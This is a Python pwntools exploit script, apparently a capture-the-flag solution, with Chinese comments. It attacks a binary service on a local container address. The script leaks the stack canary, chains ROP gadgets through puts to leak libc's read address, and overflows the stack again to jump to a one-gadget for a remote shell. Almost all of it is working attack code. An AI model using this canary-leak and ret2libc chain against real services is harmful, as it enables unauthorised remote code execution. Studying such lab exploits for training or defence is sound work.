#!/usr/bin/python
#coding:utf-8

from pwn import *

context.update(os = 'linux', arch = 'amd64')

io = remote('172.17.0.2', 10001)

pop_rdi = 0x400ea3
puts_plt = 0x4008d0
read_got = 0x602030
start = 0x4009a0

io.sendline('1')		
io.send('A'*164+'ABCDE')		#在选项1中输入168个padding字符到达canary。由于canary最后两位恒为\x00防止意外泄露，因此需要多一个字符覆盖掉\x00，使得canary可被字符串输出函数输出。
sleep(0.5)
io.sendline('2')
io.recvuntil('ABCDE')
canary = u64('\x00'+io.recv(7))	#给canary补上\x00，把被字符'B'覆盖掉的\x00恢复回来，注意是大端序。
log.info("Leak canary = %#x" %(canary))

payload = ""
payload += "A"*168		#padding
payload += p64(canary)	#在canary应该在的位置上写canary
payload += "B"*8		#这一段实际上是rbp的位置
payload += p64(pop_rdi)	
payload += p64(read_got)
payload += p64(puts_plt)
payload += p64(start)	#调用puts输出read在内存中的地址，然后回到start重新开始

io.recv()
io.sendline('1')
io.send(payload)
io.recv()
io.sendline('3')		#通过选项3退出循环，从而触发栈溢出，泄露read在内存中的地址，并计算one gadget RCE的地址
io.recvuntil('TIME TO MINE MIENRALS...\n')
read_addr = u64(io.recv()[:6]+"\x00\x00")	#u64()的参数必须是长度为8的字符串，手动补齐
log.info("Leak read addr = %#x" %(read_addr))
one_gadget_addr = read_addr - 0xf8880 + 0x45526

io.sendline('1')
payload = ""
payload += "A"*168		
payload += p64(canary)	
payload += "B"*8		
payload += p64(one_gadget_addr)				#栈溢出触发one gadget RCE
io.send(payload)
io.recv()
io.sendline('3')
io.recv()
io.interactive()

